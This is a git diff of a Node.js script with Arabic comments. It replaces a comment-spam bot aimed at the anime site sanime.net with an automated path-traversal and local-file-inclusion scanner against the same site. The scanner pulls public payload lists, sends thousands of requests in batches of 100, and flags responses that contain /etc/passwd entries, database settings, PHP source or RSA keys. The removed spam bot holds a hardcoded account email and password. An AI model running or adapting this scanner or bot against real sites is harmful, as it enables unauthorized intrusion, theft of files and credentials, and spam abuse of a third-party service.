@@ -1,187 +1,113 @@
-const axios = require("axios");
-const https = require("https");
-const express = require("express");
-const fetch = require("node-fetch");
+const axios = require('axios');
+const express = require('express');
+const http = require('http');
+const https = require('https');
+
 const app = express();
-app.use(express.urlencoded({ extended: true }));
+const port = process.env.PORT || 10000;
 
-let email = "SOOS1412123@gmail.com";
-let password = "SOOS";
-let commentText = "انمي حْرا ";
-let commentsPerMinute = 60;
-let parallelAnimeCount = 3;
-let delay = (60 / commentsPerMinute) * 1000;
-const maxCommentsPerAnime = 75;
-
-const animeTargets = {
-  532: { active: true, name: "One Piece" },
-  11729: { active: true, name: "Necronomico no Cosmic Horror Show" },
-  11728: { active: true, name: "Kanojo, Okarishimasu 4th Season" },
-  1: { active: false, name: "Apocalypse Hotel" },
-  2: { active: false, name: "Kidou Senshi Gundam" },
-  3: { active: false, name: "Shiunji-ke no Kodomotachi" },
-  11673: { active: true, name: "Kijin Gentoushou" },
-  4: { active: false, name: "Compass 2.0: Sentou" },
-  11703: { active: true, name: "Vigilante: Boku no Hero" },
-  11702: { active: true, name: "Summer Pockets" },
-  5: { active: false, name: "Aharen-san wa Hakarenai" },
-  11705: { active: true, name: "Lazarus" },
-  6: { active: false, name: "Maebashi Witches" },
-  7: { active: false, name: "Gorilla no kami kara kago" },
-  11694: { active: true, name: "Shin Samurai-den Yaiba" },
-  11697: { active: true, name: "Witch Watch" },
-  11721: { active: true, name: "The All-devouring whale" },
-  11718: { active: false, name: "Ore wa Seikan Kokka no" },
-  11724: { active: true, name: "Takopii no Genzai" },
-  8: { active: false, name: "Classic*Stars" },
-  9: { active: false, name: "A-Rank Party wo" },
-  11710: { active: true, name: "Hibi wa Sugiredo Meshi" },
-  11711: { active: true, name: "Mono" },
-  10: { active: false, name: "Kuroshitsuji: Midori no Majo" },
-  11: { active: false, name: "Katainaka no Ossan Kensei" },
-  653: { active: true, name: "Detective Conan" },
-  11686: { active: true, name: "Anne shirley" },
-  12: { active: false, name: "Slime Taoshite 300-nen" },
-  13: { active: false, name: "Nazotoki wa Dinner no Ato d" },
-  14: { active: false, name: "Chuuzenji-sensei Mononoke" },
-  15: { active: false, name: "Teogonia" },
-  11658: { active: true, name: "Kusuriya no Hitorigoto 2nd" },
-  11725: { active: true, name: "Lord of Mysteries" },
-  11726: { active: true, name: "Koujo Denka no Kateikyoushi" }
+const agent = {
+  http: new http.Agent({ keepAlive: true, maxSockets: 100 }),
+  https: new https.Agent({ keepAlive: true, maxSockets: 100 })
 };
 
-const headers = {
-  "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
-  "Content-Type": "application/x-www-form-urlencoded",
-  "Origin": "https://ios.sanime.net",
-  "Referer": "https://ios.sanime.net/",
-  "Accept": "*/*",
-  "Accept-Encoding": "gzip, deflate, br",
-  "Connection": "keep-alive",
-  "Accept-Language": "ar"
-};
+const axiosInstance = axios.create({
+  httpAgent: agent.http,
+  httpsAgent: agent.https,
+  timeout: 5000
+});
 
-const agent = new https.Agent({ keepAlive: true });
-let botActive = true;
+const payloadSources = [
+  'https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/deep_traversal.txt',
+  'https://raw.githubusercontent.com/Bo0oM/Path-Traversal-Wordlist/master/path_traversal.txt',
+  'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt'
+];
 
-function sendComment(animeId) {
-  const itemData = {
-    post: commentText,
-    id: animeId,
-    fire: false
-  };
-  const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
-  const payload = new URLSearchParams({ email, password, item: itemBase64 });
+const basePaths = [
+  "https://app.sanime.net/api/",
+  "https://app.sanime.net/api/anime/11751/",
+  "https://app.sanime.net/file/",
+  "https://app.sanime.net/assets/",
+  "https://app.sanime.net/public/",
+  "https://app.sanime.net/storage/"
+];
 
-  return axios.post(
-    "https://app.sanime.net/function/h10.php?page=addcmd",
-    payload.toString(),
-    { headers, httpsAgent: agent }
-  );
-}
+const sensitiveIndicators = [
+  'root:x', 'DB_HOST', '<?php', '[mysqld]', 'password', 'authorization', 'BEGIN RSA'
+];
 
-async function sendCommentsToAnime(animeId) {
-  const name = animeTargets[animeId]?.name || "Unknown";
-  console.log(`🚀 بدء إرسال ${maxCommentsPerAnime} تعليق إلى: [${animeId}] ${name}`);
-  for (let i = 1; i <= maxCommentsPerAnime; i++) {
-    if (!botActive) break;
+let foundLeaks = [];
+let isScanning = true;
+let currentProgress = "يتم تحميل payloads...";
 
-    try {
-      await sendComment(animeId);
-      console.log(`✅ [${animeId}] تعليق رقم ${i}`);
-    } catch (err) {
-      console.error(`❌ [${animeId}] خطأ:`, err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, delay));
-  }
-}
-
-async function startLoop() {
-  const activeAnimeIds = Object.keys(animeTargets).filter(id => animeTargets[id].active);
-  let index = 0;
-
-  while (true) {
-    if (!botActive) {
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      continue;
-    }
-
-    const batch = activeAnimeIds.slice(index, index + parallelAnimeCount);
-    if (batch.length === 0) {
-      index = 0;
-      continue;
-    }
-
-    console.log(`🔄 إرسال إلى ${batch.length} أنمي: ${batch.join(", ")}`);
-    await Promise.all(batch.map(id => sendCommentsToAnime(id)));
-
-    index += parallelAnimeCount;
-    if (index >= activeAnimeIds.length) {
-      index = 0;
-    }
-  }
-}
-
-startLoop();
-
-// 🟢 صفحة الحالة والتحكم
-app.get("/", (req, res) => {
-  const animeControls = Object.entries(animeTargets)
-    .map(([id, info]) => `
-      <label>
-        <input type="checkbox" name="anime_${id}" ${info.active ? "checked" : ""}>
-        [${id}] ${info.name}
-      </label><br>
-    `).join("");
-
+// ✅ Route: واجهة الفحص
+app.get('/', (req, res) => {
   res.send(`
-    <h2>🤖 البوت ${botActive ? "✅ يعمل" : "🛑 متوقف"}</h2>
-    <form method="POST" action="/update">
-      تعليق: <input name="commentText" value="${commentText}" /><br>
-      سرعة (تعليق/دقيقة): <input name="commentsPerMinute" value="${commentsPerMinute}" type="number"/><br>
-      عدد الأنميات بالتوازي: <input name="parallelAnimeCount" value="${parallelAnimeCount}" type="number"/><br><br>
-      <strong>الأنميات المفعّلة:</strong><br>
-      ${animeControls}
-      <br><button type="submit">🔄 تحديث الإعدادات</button>
-    </form>
-    <form action="/start"><button>تشغيل البوت</button></form>
-    <form action="/stop"><button>إيقاف البوت</button></form>
+  <html><head><meta charset="utf-8"><title>Path Traversal Scanner</title>
+  <meta http-equiv="refresh" content="10">
+  <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px}a{color:#0ff}</style>
+  </head><body>
+    <h1>📡 فحص الثغرات</h1>
+    ${isScanning ? `<p>🔄 ${currentProgress}</p>` : foundLeaks.length > 0
+      ? `<h2>🚨 تم العثور على تسريبات:</h2><ul>${foundLeaks.map(url => `<li><a href="${url}" target="_blank">${url}</a></li>`).join('')}</ul>`
+      : `<h2>✅ لا توجد تسريبات</h2>`}
+  </body></html>
   `);
 });
 
-app.post("/update", (req, res) => {
-  commentText = req.body.commentText || commentText;
-  commentsPerMinute = parseInt(req.body.commentsPerMinute) || commentsPerMinute;
-  parallelAnimeCount = parseInt(req.body.parallelAnimeCount) || parallelAnimeCount;
-  delay = (60 / commentsPerMinute) * 1000;
+// ✅ Route: keep-alive
+app.get('/ping', (req, res) => {
+  res.send('✅ ALIVE');
+});
 
-  for (const [id, obj] of Object.entries(animeTargets)) {
-    animeTargets[id].active = !!req.body[`anime_${id}`];
+async function fetchPayloads() {
+  const all = new Set();
+  for (const url of payloadSources) {
+    try {
+      const res = await axios.get(url);
+      res.data.split('\n').forEach(line => {
+        if (line.trim()) all.add(line.trim());
+      });
+    } catch (err) {
+      console.log(`⚠️ فشل تحميل ${url}`);
+    }
+  }
+  return Array.from(all);
+}
+
+async function scan() {
+  const payloads = await fetchPayloads();
+  console.log(`📦 Loaded ${payloads.length} payloads`);
+  const batchSize = 100;
+
+  for (const base of basePaths) {
+    console.log(`🚀 فحص: ${base}`);
+    for (let i = 0; i < payloads.length; i += batchSize) {
+      const batch = payloads.slice(i, i + batchSize);
+      currentProgress = `🔎 فحص ${i + 1} إلى ${i + batch.length} من ${payloads.length} على ${base}`;
+
+      await Promise.allSettled(batch.map(async payload => {
+        const url = base + encodeURIComponent(payload);
+        try {
+          const res = await axiosInstance.get(url);
+          const body = res.data.toString();
+          if (sensitiveIndicators.some(ind => body.includes(ind))) {
+            console.log(`🚨 Leak Detected: ${url}`);
+            foundLeaks.push(url);
+          }
+        } catch (_) {}
+      }));
+
+      await new Promise(resolve => setTimeout(resolve, 100)); // small delay
+    }
   }
 
-  res.redirect("/");
-});
+  isScanning = false;
+  currentProgress = '✅ فحص مكتمل';
+  console.log('✅ انتهى الفحص.');
+}
 
-app.get("/start", (req, res) => {
-  botActive = true;
-  res.redirect("/");
-});
-
-app.get("/stop", (req, res) => {
-  botActive = false;
-  res.redirect("/");
-});
-
-// إبقاء الخدمة حية
-const KEEP_ALIVE_URL = "https://soos.onrender.com/";
-setInterval(() => {
-  fetch(KEEP_ALIVE_URL)
-    .then(() => console.log("🔁 Keep-alive ping sent"))
-    .catch(err => console.error("⚠️ Keep-alive ping failed:", err.message));
-}, 5 * 60 * 1000);
-
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => {
-  console.log(`🌐 Web server running on port ${PORT}`);
+app.listen(port, () => {
+  console.log(`🟢 يعمل على المنفذ ${port}`);
+  scan();
 });
